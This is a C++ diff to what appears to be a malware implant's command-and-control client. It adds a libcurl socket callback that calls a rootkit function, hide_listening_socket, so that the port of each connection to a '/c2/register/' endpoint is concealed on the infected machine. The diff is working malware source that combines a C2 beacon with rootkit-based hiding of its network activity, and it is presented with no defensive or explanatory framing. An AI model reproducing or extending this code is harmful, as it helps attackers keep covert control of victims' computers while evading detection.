@@ -3,10 +3,13 @@
 #include <iostream>
 #include <string>
 #include <mutex>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #include "../include/curl/curl.h"
 #include "../include/json.hpp"
 #include "../Utils/CryptoUtils.h"
 #include "../Utils/MachineUtils.h"
+#include "../amazing_rootkit/api/api.h"
 
 using json = nlohmann::json;
 
@@ -23,11 +26,25 @@ private:
     CURL * curl;
     std::mutex curl_mtx;
 
-    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
+    static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
         ((std::string*)userp)->append((char*)contents, size * nmemb);
         return size * nmemb;
     }
+    
+    static curl_socket_t opensocket_callback(void *clientp, curlsocktype purpose, struct curl_sockaddr *address)
+    {
+        curl_socket_t sockfd = socket(address->family, address->socktype, address->protocol);
+        if (sockfd == CURL_SOCKET_BAD) {
+            printf("Can't create socket: %d\n", sockfd);
+        }
+        
+        struct sockaddr_in * addr_in = (struct sockaddr_in*) &address->addr;
+        
+        hide_listening_socket(ntohs(addr_in->sin_port));
 
+        return sockfd;
+    }   
+    
     bool send_request_safe(std::string uri, json payload, json * response_ptr, bool post=true)
     {
         std::lock_guard<std::mutex> lock(curl_mtx);
@@ -55,6 +72,8 @@ private:
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
         curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1234/c2/register/");
+        curl_easy_setopt(curl, CURLOPT_OPENSOCKETFUNCTION, opensocket_callback);
+
         if (post)
         {
             curl_easy_setopt(curl, CURLOPT_POST, 1L);
@@ -64,7 +83,7 @@ private:
             }
         }
 
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);
         
         res = curl_easy_perform(curl);
